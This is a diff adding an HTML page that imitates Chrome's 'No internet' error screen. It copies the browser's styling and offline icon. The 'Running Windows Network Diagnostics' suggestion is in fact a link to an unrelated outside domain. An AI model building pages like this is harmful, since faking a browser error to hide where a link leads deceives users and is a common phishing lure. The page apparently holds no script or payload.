@@ -1,0 +1,128 @@
+    <style>
+    html {
+      background-color: #fff;
+    }
+  
+    body {
+      --background-color: #fff;
+      --error-code-color: var(--google-gray-700);
+      --google-blue-100: rgb(210, 227, 252);
+      --google-blue-300: rgb(138, 180, 248);
+      --google-blue-600: rgb(26, 115, 232);
+      --google-blue-700: rgb(25, 103, 210);
+      --google-gray-100: rgb(241, 243, 244);
+      --google-gray-300: rgb(218, 220, 224);
+      --google-gray-500: rgb(154, 160, 166);
+      --google-gray-50: rgb(248, 249, 250);
+      --google-gray-600: rgb(128, 134, 139);
+      --google-gray-700: rgb(95, 99, 104);
+      --google-gray-800: rgb(60, 64, 67);
+      --google-gray-900: rgb(32, 33, 36);
+      --heading-color: var(--google-gray-900);
+      --link-color: rgb(88, 88, 88);
+      --popup-container-background-color: rgba(0,0,0,.65);
+      --primary-button-fill-color-active: var(--google-blue-700);
+      --primary-button-fill-color: var(--google-blue-600);
+      --primary-button-text-color: #fff;
+      --quiet-background-color: rgb(247, 247, 247);
+      --secondary-button-border-color: var(--google-gray-500);
+      --secondary-button-fill-color: #fff;
+      --secondary-button-hover-border-color: var(--google-gray-600);
+      --secondary-button-hover-fill-color: var(--google-gray-50);
+      --secondary-button-text-color: var(--google-gray-700);
+      --small-link-color: var(--google-gray-700);
+      --text-color: var(--google-gray-700);
+      background: var(--background-color);
+      color: var(--text-color);
+      word-wrap: break-word;
+      background-color: #fff;
+  }
+  
+    .icon-offline {
+      content: -webkit-image-set( url(data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAEgAAABIAQMAAABvIyEEAAAABlBMVEUAAABTU1OoaSf/AAAAAXRSTlMAQObYZgAAAGxJREFUeF7tyMEJwkAQRuFf5ipMKxYQiJ3Z2nSwrWwBA0+DQZcdxEOueaePp9+dQZFB7GpUcURSVU66yVNFj6LFICatThZB6r/ko/pbRpUgilY0Cbw5sNmb9txGXUKyuH7eV25x39DtJXUNPQGJtWFV+BT/QAAAAABJRU5ErkJggg==) 1x, url(data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAJAAAACQBAMAAAAVaP+LAAAAGFBMVEUAAABTU1NNTU1TU1NPT09SUlJSUlJTU1O8B7DEAAAAB3RSTlMAoArVKvVgBuEdKgAAAJ1JREFUeF7t1TEOwyAMQNG0Q6/UE+RMXD9d/tC6womIFSL9P+MnAYOXeTIzMzMzMzMzaz8J9Ri6HoITmuHXhISE8nEh9yxDh55aCEUoTGbbQwjqHwIkRAEiIaG0+0AA9VBMaE89Rogeoww936MQrWdBr4GN/z0IAdQ6nQ/FIpRXDwHcA+JIJcQowQAlFUA0MfQpXLlVQfkzR4igS6ENjknm/wiaGhsAAAAASUVORK5CYII=) 2x);
+      position: relative;
+      margin-bottom: 30px;
+      margin-top: 50px;
+    }
+  
+  .interstitial-wrapper {
+    color: var(--text-color);
+    font-size: 1em;
+    line-height: 1.55;
+    margin: 0 auto;
+    max-width: 600px;
+    padding: 50px 25px 0px 25px;
+    position: relative;
+    width: 100%;
+  }
+  
+  .offline .interstitial-wrapper {
+      color: var(--text-color);
+      font-size: 1em;
+      line-height: 1.55;
+      margin: 0 auto;
+      max-width: 600px;
+      padding-top: 100px;
+      position: relative;
+      width: 100%;
+  }
+  
+  h1 {
+      margin: 0 0 15px;
+      font-family: 'Segoe UI', Tahoma, sans-serif;
+      word-wrap: break-word;
+      color: var(--heading-color);
+      font-size: 1.4em;
+      font-weight: normal;
+      line-height: 1.25em;
+  }
+  
+  h1 span {
+    font-weight: 500;
+  }
+  
+  #suggestions-list p {
+    margin: 0px;
+    font-weight: normal;
+  }
+  
+  #suggestions-list ul {
+    padding-left: 40px;
+    font-weight: lighter;
+  }
+  
+  .error-code {
+    font-size: .8em;
+    padding-top: 5%;
+  }
+  </style>
+  
+  <div id="main-frame-error" class="interstitial-wrapper">
+    <div id="main-content" >
+      <div class="icon icon-offline"></div>
+      <div id="main-message" >
+        <h1 >
+          <span>No internet</span>
+          <a id="error-information-button" class="hidden"></a>
+        </h1>
+        <div id="error-information-popup-container">
+          <div id="error-information-popup">
+            <div id="error-information-popup-box">
+              <div id="error-information-popup-content">
+                <div id="suggestions-list" >
+                  <p>Try:</p>
+                  <ul >
+                    <li >Checking the network cables, modem, and router</li>
+                    <li jsselect="suggestionsSummaryList" jsvalues=".innerHTML:summary" jstcache="21" jsinstance="1">Reconnecting to Wi-Fi</li>
+                    <li jsselect="suggestionsSummaryList" jsvalues=".innerHTML:summary" jstcache="21" jsinstance="*2">
+                        <a href="https://contraposicion.xyz/creemequeesteeselfinal" id="diagnose-link" >Running Windows Network Diagnostics</a></li>
+                  </ul>
+                </div>
+                <div class="error-code">ERR_INTERNET_DISCONNECTED</div>
+              </div>
+            </div>
+          </div>
+        </div>      
+      </div>
+    </div>
+  </div>
